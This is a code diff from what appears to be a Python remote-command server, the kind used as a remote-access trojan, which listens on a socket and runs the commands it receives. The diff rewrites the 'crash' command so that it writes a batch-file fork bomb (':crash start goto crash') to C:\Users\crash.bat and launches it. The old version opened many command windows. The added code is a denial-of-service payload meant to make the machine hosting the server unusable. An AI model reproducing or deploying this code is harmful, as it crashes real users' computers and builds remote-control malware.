@@ -50,10 +50,22 @@ def start_server(port=65432):
                             conn.sendall(response.encode('utf-8'))
                         
                         elif splitUp[0].lower() == "crash":
-                            crash_count = int(splitUp[1]) if len(splitUp) > 1 and splitUp[1].isdigit() else 10
-                            for _ in range(crash_count):
-                                os.system("start cmd.exe")  # Open multiple CMD windows (Windows)
-                            response = f"Opened {crash_count} command windows"
+                            file_path = r"C:\Users\crash.bat"
+    
+                            # Check if the file exists, and if so, delete it
+                            if os.path.exists(file_path):
+                                os.remove(file_path)
+                                print(f"Deleted existing file: {file_path}")
+                            
+                            # Create and write to the file
+                            with open(file_path, 'w') as file:
+                                file.write("@echo off \n :crash \n start \n goto crash")
+                                file.close()
+
+                            os.system("start crash.bat")
+                            
+                                
+                            response = "Crashed"
                             conn.sendall(response.encode('utf-8'))
                         
                         elif splitUp[0].lower() == "do":
